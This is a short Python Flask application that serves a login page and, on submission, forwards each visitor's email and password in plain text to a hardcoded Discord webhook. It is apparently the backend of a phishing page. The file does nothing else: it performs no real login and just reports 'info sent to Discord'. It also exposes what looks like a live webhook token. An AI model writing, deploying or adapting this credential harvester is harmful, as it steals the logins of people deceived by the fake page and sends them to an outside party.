from flask import Flask, render_template, request
import requests
import os

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1403114831095267519/YlA2OvGZNVZe83ojBpZApnNt-SFcyfb11UzxpbkuWUA21hJBS6oG6NnfRuuP3Iq0-nik"

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    payload = {
        "content": f"🔐 Nouvelle tentative de login :\n📧 Email: {email}\n🔑 Mot de passe: {password}"
    }

    requests.post(DISCORD_WEBHOOK_URL, json=payload)

    return "Infos envoyées à Discord ✅"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)